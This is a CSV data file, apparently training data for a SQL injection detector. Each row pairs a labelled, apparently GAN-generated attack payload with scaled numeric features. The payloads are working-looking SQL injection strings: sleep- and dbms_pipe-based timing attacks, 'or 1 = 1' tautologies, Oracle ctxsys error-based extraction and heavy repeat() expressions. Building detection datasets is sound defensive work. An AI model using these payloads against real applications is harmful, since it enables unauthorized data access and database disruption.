id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000361,attack,time,"1""  )   as mohv where 2171  =  2171 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R006072,6.24646296303312,87.56906127929688,25.894243240356445,1.5974537134170532,82.12971496582031,3.3725857734680176,39.91292953491211,21.27911376953125,0.9996833801269531,0.5342432856559753,-0.06530413031578064,0.2773889899253845,0.08517607301473618,3.2220871448516846,-2.3521244525909424,0.2563692331314087,-0.906677782535553,0.9578951597213745,0.15597456693649292,0.08513275533914566,2.8019938468933105,2.2409348487854004,0.6850510239601135,0.03127237409353256,1.006731390953064,0.17513388395309448,-0.0024439780972898006,0.5762794613838196,-0.9307334423065186,0.6129674911499023,0.12399295717477798,0.019132988527417183,-0.20483028888702393,-0.27101755142211914,0.9707270860671997,0.3076232671737671,3.8219707012176514,0.254647433757782,0.9624842405319214,-0.16753746569156647,0.8284003138542175,1.2236641645431519,0.7835404872894287,-0.036336276680231094,0.0903831273317337,0.12624911963939667,0.03456612676382065,-0.1649116724729538,-0.37116459012031555,0.17316491901874542,0.17033231258392334,-0.38165292143821716,0.09893085062503815,-0.0716732069849968,0.1099894717335701,0.06324714422225952,0.08535489439964294,-0.0737716555595398,-0.010798992589116096,-0.022402264177799225,-0.0035098069347441196,-0.04127782955765724,-0.0050470563583076,-0.47197774052619934,-0.16029636561870575,-0.08229493349790573,-0.1511853039264679,-0.41186919808387756,0.11061035096645355,0.016900617629289627,-0.04523129388689995,0.016776317730545998,0.006317916326224804,0.04227641597390175,0.017748180776834488,0.13200488686561584,-0.36915096640586853,0.9158734679222107,-0.012603356502950191,0.19844362139701843,-0.032395873218774796,2.2186150550842285,0.3138795793056488,-0.05350539833307266,0.6430934071540833,-0.009821414947509766,-0.00029020418878644705,-0.2260480374097824,0.025007400661706924
GAN_000362,attack,time,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,nearest_attack_euclidean,R005790,7.59984808499822,1.7727748155593872,16.030452728271484,-0.23171457648277283,-67.65899658203125,-5.344904899597168,16.20170783996582,-12.38650131225586,0.997785210609436,0.40439072251319885,0.007441010791808367,0.37975063920021057,0.09980756789445877,4.377037048339844,3.763509750366211,1.063500165939331,-0.17384345829486847,1.0031465291976929,-0.0672699436545372,-0.046850964426994324,-0.19520021975040436,0.0276489295065403,0.07487842440605164,-0.009110169485211372,0.335248202085495,-0.056940726935863495,0.08254082500934601,0.6636490225791931,-0.3036949336528778,1.1013143062591553,-0.12564238905906677,0.07397312670946121,-0.3487332761287689,0.3729799687862396,0.8035415410995483,-0.13530294597148895,-0.5447704195976257,2.2977311611175537,0.40074536204338074,-0.052324071526527405,-0.06334132701158524,0.8087199926376343,0.3933505415916443,0.23550456762313843,0.20078156888484955,-0.014004046097397804,0.005092885810881853,0.38452842831611633,0.031210819259285927,-0.10805267095565796,-0.35577842593193054,0.029880007728934288,0.4576919376850128,0.06833550333976746,-0.023108599707484245,0.00678884657099843,0.07189412415027618,-0.08830063045024872,0.012374073266983032,-0.8887162804603577,0.012445535510778427,-0.7008038759231567,-0.015418775379657745,1.734081745147705,0.16959357261657715,0.049745913594961166,-0.0676642507314682,-0.32283225655555725,-0.967839241027832,0.003148381132632494,0.02043788693845272,0.009635011665523052,-0.002156925154849887,-0.03554379567503929,-0.013350319117307663,-0.04027656838297844,0.18626859784126282,1.4163097143173218,-0.0009926086058840156,0.05548618361353874,0.20809972286224365,2.46870756149292,0.6949540376663208,-0.06586680561304092,0.6449711322784424,0.041792355477809906,0.05119796842336655,0.08643914014101028,-0.015838932245969772
GAN_000363,attack,boolean,"1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R002689,6.146825348519247,312.31982421875,89.18566131591797,51.429813385009766,177.1219024658203,-1.9389568567276,70.44395446777344,60.8386344909668,1.0002539157867432,0.42529088258743286,0.15259923040866852,0.47354796528816223,0.13537712395191193,3.7277443408966064,1.988024115562439,0.24646982550621033,1.3680567741394043,0.14797906577587128,0.014951088465750217,-0.04512181133031845,14.754179954528809,15.3306303024292,3.431727647781372,0.010234332643449306,3.2699384689331055,0.03645148500800133,-0.10052843391895294,-0.08357734978199005,2.313222885131836,-0.4699796438217163,-0.035588011145591736,0.051878105849027634,-0.19684556126594543,-0.24796046316623688,0.4157521426677704,2.8114988803863525,9.283576965332031,0.7384244203567505,1.2164859771728516,0.0001050380160450004,0.7195738554000854,0.42047131061553955,0.06355864554643631,-0.12196174263954163,-0.12004593014717102,-0.05011491850018501,-0.02378220111131668,0.33604371547698975,0.3688127398490906,0.16658549010753632,0.5776976943016052,0.3625130355358124,-0.021745536476373672,-0.053515102714300156,0.07525002211332321,0.018117688596248627,-0.09626676887273788,0.15096575021743774,0.008120507933199406,0.4056098163127899,0.008309321478009224,0.007318120449781418,0.010516845621168613,3.4484269618988037,0.028789207339286804,0.016383500769734383,-0.04221571609377861,-0.2638063132762909,0.5765668153762817,0.006263752467930317,0.06096000596880913,-0.007203484885394573,0.006557884626090527,-0.014118452556431293,-0.012230521999299526,0.0011063447454944253,1.453263521194458,-0.2124626636505127,-0.0009370619081892073,0.1463300734758377,-0.12056718021631241,8.552042007446289,0.7737714648246765,0.03328699618577957,0.07919380813837051,-0.015629641711711884,0.02521960623562336,-0.15684868395328522,0.0328223817050457
GAN_000364,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.635730494171284,25.62681770324707,30.875396728515625,6.643900394439697,17.217561721801758,-0.24893280863761902,11.451160430908203,7.96875,1.0000602006912231,0.30058929324150085,0.10667263716459274,0.36866649985313416,0.1754668802022934,3.212005138397217,0.5020229816436768,1.979013442993164,-0.19510002434253693,-0.15210725367069244,0.13234515488147736,-0.009306609630584717,2.117619514465332,2.937859296798706,1.7004069089889526,0.02354225516319275,0.906274139881134,-0.04644670709967613,0.002477740403264761,0.18777428567409515,-0.5673761367797852,-0.18919934332370758,0.0070652891881763935,-0.017232617363333702,0.39353248476982117,-0.08218119293451309,-0.1697499305009842,0.7751391530036926,1.8860740661621094,0.8075541853904724,0.1012520045042038,-0.11724333465099335,-0.012990662828087807,-0.1637362837791443,0.13595205545425415,0.012715764343738556,0.0698803961277008,0.025245055556297302,-0.0026538947131484747,-0.0704878494143486,-0.02723141573369503,-0.02227388136088848,-0.02251637913286686,0.0680529773235321,0.4496084749698639,0.0037672934122383595,-0.0680423378944397,-0.004160598386079073,0.057819757610559464,0.1349041610956192,-0.002836693776771426,-0.08804149925708771,-0.0028633023612201214,-0.10934862494468689,0.006618394982069731,0.13592246174812317,-0.08696015924215317,-0.061126723885536194,0.084508515894413,0.25498610734939575,-0.2295345515012741,-0.0008855807827785611,-0.015602035447955132,-0.003904367098584771,0.0007246062741614878,0.01250877883285284,0.0008842528914101422,-0.053756196051836014,1.1540864706039429,-0.1622999608516693,-0.004343762993812561,0.30790507793426514,0.041410770267248154,-0.2942405343055725,0.6187233924865723,0.04069199413061142,0.1685536503791809,0.03702231124043465,0.01887884922325611,0.07329080253839493,0.009758076630532742
GAN_000365,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",nearest_attack_euclidean,R002367,5.26991609600554,176.05406188964844,69.91802978515625,26.10391616821289,57.084293365478516,-4.330602169036865,39.27985763549805,29.183156967163086,0.9999200701713562,0.41478559374809265,0.057335566729307175,0.4377855956554413,0.11055371910333633,3.68394136428833,0.7067223787307739,-1.807870626449585,0.8437923192977905,0.33173611760139465,-0.04391932860016823,-0.07387373596429825,10.367947578430176,7.648216724395752,2.0199623107910156,-0.03689354285597801,1.2702538967132568,-0.1082020029425621,-0.037027548998594284,0.5360075235366821,0.7271358370780945,-0.10974553972482681,0.05059567466378212,-0.005900118034332991,-0.06480223685503006,0.061564214527606964,0.21294088661670685,0.9407734870910645,8.15307903289795,-1.0072338581085205,0.5034570693969727,-0.23199300467967987,-0.0321962907910347,0.5007023215293884,-0.0206066332757473,0.045939307659864426,-0.032149724662303925,0.0186675526201725,-0.016748812049627304,0.4460773169994354,0.41104409098625183,0.3101579546928406,0.3215143382549286,0.710395336151123,0.08463704586029053,-0.0003598391776904464,6.878736894577742e-05,-0.03604352846741676,0.10099797695875168,0.19727188348770142,0.024434329941868782,0.3549678921699524,0.0022499484475702047,-0.1498432606458664,-0.00043676953646354377,1.517992615699768,0.04050200805068016,-0.00649242801591754,0.031161949038505554,-0.03041614219546318,-0.0087639931589365,0.0009381384588778019,0.03224879503250122,-0.007071845233440399,-0.00192167644854635,0.007255257107317448,0.0020803455263376236,-0.023147208616137505,0.9232194423675537,-0.3658326268196106,0.0009699829388409853,-0.014525184407830238,-0.0019047290552407503,5.941841125488281,0.5346698760986328,0.14044053852558136,0.15914902091026306,0.051068905740976334,0.06507308036088943,0.06972865015268326,0.006977400276809931
GAN_000366,attack,time,"1"" and sleep  (  5  )  ",nearest_attack_euclidean,R005102,5.693969509571714,5.930359840393066,22.153718948364258,-1.545528769493103,24.913862228393555,3.211742639541626,15.434240341186523,14.984206199645996,1.000280499458313,0.3043096661567688,0.03189488872885704,0.3108971118927002,0.21164776384830475,3.0095157623291016,-0.006638390012085438,0.7246758937835693,0.5144351720809937,-0.3506905734539032,0.3046703040599823,0.03737152740359306,2.162693738937378,2.6823923587799072,1.2971947193145752,0.04818402975797653,0.5151473879814148,-0.02086814120411873,0.0016216408694162965,-0.547415554523468,-1.1337603330612183,0.3129579722881317,0.008995709009468555,-0.05872980132699013,0.5880964398384094,-0.3801186680793762,0.001739660045132041,0.13530023396015167,4.642200469970703,0.9628942012786865,0.33201882243156433,-0.1739455610513687,-0.14998872578144073,-0.14970725774765015,0.819514811038971,-0.1419193595647812,0.04482172057032585,0.05800974369049072,0.00453460356220603,-0.24192453920841217,-0.13688896596431732,0.16314834356307983,0.0824924111366272,-0.12080268561840057,0.4219842851161957,0.024119462817907333,-0.09330423921346664,0.041102033108472824,0.10147259384393692,-0.004035967867821455,0.00956074520945549,-0.4118153750896454,-0.002346887718886137,0.12102273106575012,0.008710959926247597,1.5039939880371094,-0.14047302305698395,-0.09858410805463791,0.04898776486515999,0.0892031267285347,0.01865573041141033,0.004948355257511139,-0.09325160831212997,-0.007655765861272812,0.00636534346267581,0.05251144617795944,0.00462710577994585,-0.08751697093248367,1.059821367263794,0.04351812228560448,-0.01725633069872856,0.5779909491539001,0.07730891555547714,0.3846520781517029,-0.09178368747234344,0.04836282879114151,0.6827048659324646,-0.05902744084596634,0.011470414698123932,-0.0643128827214241,0.027453966438770294
GAN_000367,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000273,3.400473763884776,12.151597023010254,22.446922302246094,2.1082074642181396,-4.707366943359375,-1.487903356552124,1.3130401372909546,0.4428691565990448,0.9993138909339905,0.2865527868270874,0.10779237747192383,0.42345014214515686,0.16566582024097443,2.9095990657806396,2.018481969833374,0.5866731405258179,0.7977089881896973,0.03422504663467407,0.11877911537885666,-0.007575380150228739,0.4467291533946991,1.658487319946289,1.1046738624572754,0.005730498116463423,0.6304402351379395,-0.017703726887702942,0.023113705217838287,-0.128241166472435,-0.529940664768219,0.07087097316980362,-0.06975099444389343,0.03506260737776756,-0.1762693226337433,-0.023443857207894325,0.2156612128019333,0.3396350145339966,0.17595723271369934,1.1394141912460327,0.05072377249598503,-0.09966076910495758,-0.08504984527826309,-0.07382722944021225,0.23718594014644623,-0.020061621442437172,0.0627162978053093,-0.01665850356221199,-0.020081892609596252,0.06766615062952042,-0.015023430809378624,-0.006838260218501091,-0.12048646062612534,0.10145503282546997,0.21492210030555725,0.00541679048910737,-0.05965038388967514,0.0009725808631628752,0.023706786334514618,-0.005899574141949415,0.00043042030301876366,-0.2031860053539276,0.002571429591625929,-0.0841972678899765,-0.0020242079626768827,0.6608022451400757,0.028439374640583992,-0.035320982336997986,-0.04577179625630379,0.09106344729661942,-0.3684696555137634,0.004333632532507181,-0.004721482750028372,0.001710088923573494,0.0009240108192898333,0.012401948682963848,-0.0026252958923578262,-0.03868601471185684,0.1999519169330597,0.6995600461959839,0.0007751730736345053,0.20483683049678802,0.030540112406015396,0.1811322420835495,0.7974663376808167,-0.03999833017587662,0.17286211252212524,-0.04125319421291351,0.010882277972996235,-0.17807970941066742,-0.0012922604801133275
GAN_000368,attack,error,"1   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  6395  =  6395",nearest_attack_euclidean,R008817,6.128296944609123,313.9360046386719,91.73795318603516,55.34923553466797,167.25083923339844,-3.2484207153320312,59.69005584716797,64.78107452392578,0.9997806549072266,0.33449211716651917,0.11937124282121658,0.5341569185256958,0.13978591561317444,3.4878649711608887,-0.2781223952770233,2.2127392292022705,0.4704427719116211,0.4167819023132324,-0.0946635827422142,-0.12538348138332367,17.155696868896484,17.37103843688965,3.5994763374328613,-0.02648979052901268,2.96870493888855,-0.056241996586322784,-0.13730579614639282,0.8695075511932373,2.086040496826172,-0.3864614963531494,0.028287818655371666,-0.009056677110493183,0.5564751625061035,-0.2025679498910904,-0.20088274776935577,2.541389226913452,11.876386642456055,0.15529976785182953,0.7862071394920349,-0.19258011877536774,-0.06496519595384598,0.653599202632904,0.1264953464269638,0.014809239655733109,-0.18314039707183838,-0.02699168398976326,-0.00468714302405715,0.6578907370567322,0.8055006265640259,0.5633290410041809,0.8638333082199097,0.8970699906349182,0.14710861444473267,0.024353299289941788,0.05251094326376915,-0.015049279667437077,-0.010840664617717266,0.24046599864959717,0.022594541311264038,0.4812762141227722,0.014946870505809784,-0.12258131802082062,0.016805091872811317,3.659081220626831,0.01484390813857317,0.06215524673461914,0.1380693018436432,-0.08792810887098312,0.271930456161499,0.0014284041244536638,0.07816708832979202,-0.012990362010896206,0.003773452015593648,-0.014319305308163166,-0.00442884024232626,-0.15134158730506897,2.4120848178863525,0.009202060289680958,-0.0036772312596440315,-0.08309847116470337,-0.033153463155031204,10.000532150268555,0.4847905933856964,0.048259906470775604,0.2592996656894684,0.1484115570783615,0.022846300154924393,0.3550568222999573,0.04249485209584236
GAN_000369,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,7.535966883841739,356.9732360839844,95.30855560302734,60.089237213134766,169.65093994140625,-4.963255882263184,53.49091339111328,56.31360626220703,0.999787449836731,0.4003419876098633,0.1691533625125885,0.6218050718307495,0.1381799280643463,3.833829164505005,2.751793146133423,-1.0551024675369263,1.93777596950531,0.12770608067512512,-0.05133536830544472,-0.08387184888124466,16.709508895874023,16.13977813720703,1.0515410900115967,-0.049368716776371,3.6273019313812256,-0.038486022502183914,-0.07983896136283875,-0.13977520167827606,3.9933037757873535,-0.13013814389705658,0.08482223749160767,0.06568333506584167,-0.3431166708469391,-0.06673777848482132,-0.2106054574251175,3.2379209995269775,10.2899751663208,0.6231418251991272,1.7626848220825195,-0.0697307139635086,0.3197784423828125,0.8557532429695129,0.29547637701034546,-0.2067551612854004,-0.27827581763267517,-0.0852886363863945,-0.10165858268737793,1.1917616128921509,1.3267287015914917,0.9843958020210266,1.2226663827896118,1.8053921461105347,-0.10550771653652191,0.015290426090359688,-0.04068984091281891,-0.02635110728442669,-0.06171375513076782,0.039907049387693405,0.04676930978894234,0.39066973328590393,0.01578311063349247,0.33224374055862427,0.0012175946030765772,4.474511623382568,0.22274373471736908,0.10698162764310837,-0.2589581310749054,-0.15268512070178986,0.6594665050506592,0.005732699763029814,0.08881831169128418,-0.015283782966434956,0.0012457390548661351,0.03844403848052025,-0.01332812663167715,0.007226124871522188,0.7114753723144531,0.37208274006843567,0.022455323487520218,-0.17010019719600677,-0.16454745829105377,14.164711952209473,0.7941240668296814,0.04421951621770859,0.14387944340705872,0.0826806128025055,0.021900013089179993,-0.15492595732212067,0.05476267635822296
GAN_000370,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R007261,5.1096289429998,33.62126922607422,33.472660064697266,6.7543511390686035,72.61080932617188,1.8905155658721924,28.51611328125,16.40642738342285,0.9996234178543091,0.38843971490859985,0.005931865889579058,0.4540838599205017,0.13250258564949036,3.076603651046753,1.0737333297729492,1.3728293180465698,0.8443065285682678,-0.11047427356243134,0.22360976040363312,0.011672798544168472,1.7279225587844849,4.748103141784668,1.0433220863342285,0.04512469097971916,1.2134079933166504,0.12384434789419174,-0.013601082377135754,-0.2722892761230469,-0.4365605413913727,0.06766263395547867,-0.04637351632118225,0.011002251878380775,0.11006014794111252,-0.16570830345153809,0.38219889998435974,0.7994161248207092,2.5621206760406494,1.6848363876342773,0.5582467913627625,-0.04061518609523773,0.7318030595779419,0.020674116909503937,1.093741774559021,-0.08445672690868378,0.05875381454825401,0.041732195764780045,0.036666642874479294,-0.0509662963449955,-0.06751171499490738,0.17745192348957062,0.22053304314613342,-0.1604032665491104,0.1628272533416748,-0.027876699343323708,-0.03017411194741726,0.05566351115703583,0.03584015741944313,-0.21322371065616608,-0.006464807782322168,-0.28463855385780334,0.00540108373388648,0.08842003345489502,0.0046190801076591015,0.4976659417152405,-0.06671255081892014,-0.0707627385854721,-0.14224468171596527,-0.12523506581783295,-0.14232514798641205,0.014483999460935593,-0.03530574217438698,0.006255750544369221,0.005815352778881788,0.058929458260536194,-0.01040355209261179,-0.03406992182135582,0.1384752094745636,0.9093471169471741,-0.0076708486303687096,0.4470694661140442,0.022415991872549057,0.9093093276023865,0.4597756564617157,0.008298001252114773,1.073153018951416,-0.05179312825202942,-0.019832635298371315,-0.15187090635299683,0.003971395548433065
GAN_000371,attack,boolean,"1""   )    )    as sdlv where 5922  =  5922 and 2006  =  2006",nearest_attack_euclidean,R001500,3.1350252420063134,72.82188415527344,34.101436614990234,17.49265480041504,50.33526611328125,0.2174571007490158,15.32685661315918,8.986603736877441,0.9998420476913452,0.34162643551826477,0.1650344431400299,0.39752015471458435,0.09665828943252563,3.24529767036438,-0.31235262751579285,1.6867252588272095,0.24111531674861908,0.08861036598682404,0.09547679871320724,-0.003729840274900198,2.873720169067383,4.2890543937683105,1.3863431215286255,0.01235580537468195,1.8266634941101074,0.037026356905698776,-0.023922255262732506,-0.0072029088623821735,-0.29078564047813416,-0.3499595522880554,-0.0629979744553566,0.030931413173675537,0.038996826857328415,0.011802351102232933,0.11452365666627884,1.5474637746810913,0.9854039549827576,0.5486626625061035,-0.013160902075469494,-0.04127241671085358,0.5446116328239441,-0.10132157057523727,0.20225006341934204,0.020274363458156586,0.06316488236188889,0.002607714617624879,-0.003473525634035468,-0.019138088449835777,-0.01604648493230343,-0.07233144342899323,-0.040454428642988205,0.004359793849289417,0.2891426682472229,-0.014304609969258308,0.0029746796935796738,0.007401080336421728,0.020304100587964058,0.03350481018424034,-0.02045978419482708,-0.041300274431705475,0.0017663062317296863,-0.20527420938014984,0.004672505892813206,0.009232290089130402,-0.04967960715293884,-0.04519728571176529,0.028219133615493774,0.0050763459876179695,-0.1746310144662857,0.001569015090353787,0.027570582926273346,0.004042710177600384,0.001162113854661584,-0.004682542756199837,-0.0005311221466399729,1.8647522665560246e-05,0.9693768620491028,0.16991576552391052,0.0014246345963329077,0.119257852435112,-0.0072874347679317,-0.09357650578022003,1.10933518409729,-0.02426258474588394,0.28188613057136536,0.02209288999438286,0.020777568221092224,-0.09325065463781357,-0.0015124474884942174
GAN_000372,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,6.8616811651569405,216.6028594970703,93.54867553710938,35.75269317626953,85.32369995117188,-0.9064981937408447,34.071319580078125,37.835872650146484,1.000360369682312,0.43312057852745056,0.1562417447566986,0.46736398339271545,0.15674510598182678,3.5824155807495117,-0.27555426955223083,-0.30460941791534424,1.9230681657791138,0.20153793692588806,0.12655594944953918,-0.019210748374462128,9.700987815856934,6.295960903167725,0.4498693645000458,-0.060313351452350616,2.0675208568573,-0.009953167289495468,-0.005613429006189108,0.26158568263053894,1.4600971937179565,0.26722049713134766,0.14115463197231293,0.051857028156518936,-0.22536110877990723,0.2938469648361206,0.25304627418518066,2.1925036907196045,6.653379440307617,-0.5434336066246033,2.5396244525909424,-0.2962130904197693,0.1610606461763382,1.4979912042617798,0.23360353708267212,-0.1542273461818695,-0.15543179214000702,0.02869393303990364,-0.0708116814494133,1.145285725593567,1.2138365507125854,1.2550625801086426,1.1111332178115845,1.8594309091567993,-0.8875938057899475,-0.012164933606982231,0.006289621815085411,-0.037044692784547806,0.073305644094944,-0.12965178489685059,-0.011135376058518887,0.6650153398513794,0.0017221871530637145,0.3160189986228943,-0.00418891990557313,-0.3795922100543976,0.15967276692390442,0.030982155352830887,-0.038586463779211044,0.011376355774700642,0.7241073250770569,-0.002967746928334236,0.04723760858178139,-0.006384121719747782,0.004431266337633133,0.1276833713054657,0.024535419419407845,0.09479736536741257,0.5881624817848206,-0.4808464050292969,0.012742167338728905,-0.19986970722675323,-0.1424843668937683,11.148892402648926,0.688492476940155,0.21474981307983398,0.13532695174217224,0.1401200145483017,0.037631332874298096,0.07307514548301697,0.06124531850218773
GAN_000373,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual",nearest_attack_euclidean,R006487,3.789763936039914,126.5253677368164,50.16878128051758,12.40785026550293,80.29900360107422,1.4566705226898193,41.33939743041992,31.166086196899414,1.000793218612671,0.4342094957828522,0.07942667603492737,0.32291457056999207,0.16559557616710663,3.545250654220581,-0.11983679234981537,1.3624738454818726,0.12489437311887741,0.06550273299217224,0.14752788841724396,0.034968990832567215,6.355830669403076,4.534656524658203,2.020012378692627,0.012759331613779068,1.1034866571426392,0.031880933791399,-0.015207949094474316,0.3111806809902191,-0.2924446165561676,-0.29355084896087646,0.020406609401106834,0.018383480608463287,-0.15118911862373352,-0.19281461834907532,0.14136742055416107,0.8781625032424927,4.534339427947998,0.15423054993152618,1.1103752851486206,-0.04770870506763458,0.42952242493629456,0.9214582443237305,0.11981437355279922,-0.07198061048984528,0.01721023954451084,0.03296791762113571,-0.01082095131278038,-0.040346208959817886,-0.053208429366350174,0.028738508000969887,0.13503272831439972,-0.020524920895695686,-0.09921495616436005,-0.05252127721905708,0.07861892879009247,0.006597787607461214,0.03626178205013275,0.13823407888412476,-0.01991710625588894,0.17607107758522034,-0.004368912428617477,-0.25147661566734314,0.0017047981964424253,-0.1983758509159088,-0.112067312002182,-0.0711333304643631,0.026782281696796417,-0.266776978969574,0.0748787671327591,-0.001699261018075049,-0.0021100747399032116,0.00325627694837749,0.005226374138146639,0.00834317784756422,0.006746353581547737,0.04409058019518852,0.12559592723846436,-0.12775027751922607,-0.009139224886894226,0.1337631493806839,-0.08418997377157211,1.71160089969635,0.3642273545265198,0.01064122375100851,0.0056251296773552895,0.006859395653009415,0.022559482604265213,-0.1681826412677765,0.026481902226805687
GAN_000374,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo",nearest_attack_euclidean,R008550,5.230554295942411,51.61167907714844,32.58149337768555,4.508137226104736,53.84238052368164,0.9444262981414795,37.141502380371094,20.810428619384766,0.999445915222168,0.31641995906829834,0.024962272495031357,0.40652376413345337,0.21788647770881653,3.195347547531128,4.203126907348633,1.7296472787857056,0.29310882091522217,-0.19264735281467438,0.18819059431552887,0.016834672540426254,2.4608898162841797,5.096202850341797,2.9919161796569824,0.04937291145324707,1.4998923540115356,0.042312491685152054,-0.013527383096516132,-0.21968553960323334,-0.09789302200078964,-0.13770894706249237,0.017933564260601997,0.004150758031755686,0.5477874279022217,0.008535211905837059,0.372017502784729,1.3893146514892578,2.1325325965881348,2.8535828590393066,0.602462649345398,-0.037805184721946716,-0.03085515834391117,-0.42963194847106934,0.5796801447868347,0.01818283647298813,0.05483727902173996,0.04250052571296692,0.07267636060714722,-0.19607116281986237,-0.05109037831425667,0.00990028865635395,0.07969370484352112,-0.36534276604652405,0.8080637454986572,0.014620737172663212,-0.07226868718862534,0.026204772293567657,0.03365201875567436,-0.005250524263828993,0.02585294283926487,-0.17958354949951172,0.007129821926355362,0.057609643787145615,0.015643185004591942,1.5952409505844116,-0.14610978960990906,-0.061830729246139526,0.025426413863897324,0.24653898179531097,0.12902545928955078,0.005195821635425091,-0.019572896882891655,-0.002856493927538395,0.0049851881340146065,0.020290786400437355,-0.015367407351732254,-0.06240268424153328,1.5419516563415527,0.1612403392791748,-0.00727531872689724,0.5954117774963379,0.11639159917831421,1.8476482629776,0.6326290369033813,0.006972155999392271,0.6887725591659546,-0.0010337121784687042,0.00595853803679347,0.08727910369634628,0.012531168758869171
